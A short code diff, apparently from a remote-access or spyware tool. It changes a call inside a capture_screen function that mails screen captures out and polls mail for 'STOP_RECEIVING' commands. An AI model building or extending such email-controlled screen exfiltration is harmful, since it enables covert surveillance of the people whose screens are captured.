@@ -18,7 +18,7 @@ def capture_screen():
             f.write(data)
         
         cmd = 'LIVESCREEN'
-        g.send_message_with_attachment(cmd, file_path)
+        g.send_mail_with_attachment(cmd, file_path)
         # listen to next command from client: continue or back
         check_stop = g.read_mail()
         if("STOP_RECEIVING" in check_stop):
